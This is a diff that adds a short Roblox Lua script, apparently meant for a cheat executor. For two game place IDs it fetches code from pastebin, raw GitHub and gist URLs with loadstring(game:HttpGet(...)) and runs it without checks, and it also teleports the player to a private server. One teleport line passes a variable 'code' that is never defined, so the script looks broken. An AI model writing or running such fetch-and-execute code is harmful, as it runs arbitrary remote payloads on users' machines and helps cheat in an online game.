@@ -1,0 +1,19 @@
+local Players = game:GetService("Players")
+local AmountOfPlayers = #Players:GetPlayers()
+local TS = game:GetService("TeleportService")
+loadstring(game:HttpGet("https://pastebin.com/raw/sDXcYFhR", true))()
+
+if game.PlaceId == 3260590327 then
+if AmountOfPlayers >= 2 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rapnz/scripts/master/AmnesiaEmptyServerFinder.lua"))()
+end
+loadstring(game:HttpGet("https://pastebin.com/raw/13MHwxhH", true))()
+end
+
+if game.PlaceId == 5591597781 then
+if AmountOfPlayers >= 2 then
+TS:TeleportToPrivateServer(3260590327, code, Players.LocalPlayer)
+end
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ScriptShowcaser/833a3875026fd8a7030c121b2fa1298f/raw/d34e49557a61f7ad9d94520fcda01ad34e5cbf95/tdsgems",true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/13MHwxhH", true))()
+end
